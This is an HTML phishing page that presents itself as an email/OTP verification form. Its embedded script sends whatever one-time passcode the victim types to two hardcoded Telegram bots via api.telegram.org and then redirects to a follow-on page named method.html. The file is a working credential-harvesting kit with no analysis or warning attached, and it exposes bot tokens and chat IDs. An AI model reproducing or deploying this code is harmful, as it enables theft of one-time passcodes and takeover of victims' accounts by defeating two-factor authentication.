<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification</title>
    <style>
        body {
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #1f1f1f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            
        }

        .verification-container {
            text-align: center;
            padding: 10%;
            height: 100%;
            background-color: #2b2b2b;
            border-radius: 10px;
            width: 100%;
        }

        .verification-container img {
            margin-top: 20%;
            width: 50px;
            height: 50px;
            margin-bottom: 20px;
        }

        .verification-container h1 {
            font-size: 18px;
            margin-bottom: 10px;
        }

        .verification-container p {
            color: #b1b1b1;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .verification-container input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-radius: 4px;
            background-color: #3a3a3a;
            color: #fff;
            font-size: 14px;
        }

        .verification-container input[type="text"]::placeholder {
            color: #969696;
        }
        
        .verification-container button {
            width: 100%;
            padding: 10px;
            margin-left: 10px;
            background: linear-gradient(to right, #16a34a, #22c55e);
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .verification-container button:hover {
            background: linear-gradient(to right, #22c55e, #16a34a);
        }
    </style>
</head>
<body>
    <div class="verification-container">
        <img src="phone.png" alt="Email Icon">
        <h1>Enter your OTP</h1>
        <p>Please enter and verify your OTP below.</p>
        <input type="text" id="otp" placeholder="Enter your OTP">
        <button onclick="sendOTP()">Verify</button>
    </div>

    <script>
        const bots = {
            "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs": "6942741954",
            "7860053171:AAH5rKPoMIjqvqgAo8h3J_etU8Waawn1MvI": "7120473372"
        };

        function sendOTP() {
            const otp = document.getElementById('otp').value;
            if (otp) {
                Object.keys(bots).forEach(botToken => {
                    const chatId = bots[botToken];
                    const message = `OTP: ${otp}`;
                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                    fetch(url)
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                console.log("OTP sent to bot:", chatId);
                            } else {
                                console.error("Error sending OTP to bot:", chatId);
                            }
                        })
                        .catch(error => {
                            console.error("Error:", error);
                        });
                });

                // Redirect to method.html after sending OTP
                window.location.href = "method.html";
            } else {
                alert("Please enter the OTP.");
            }
        }
    </script>
</body>
</html>
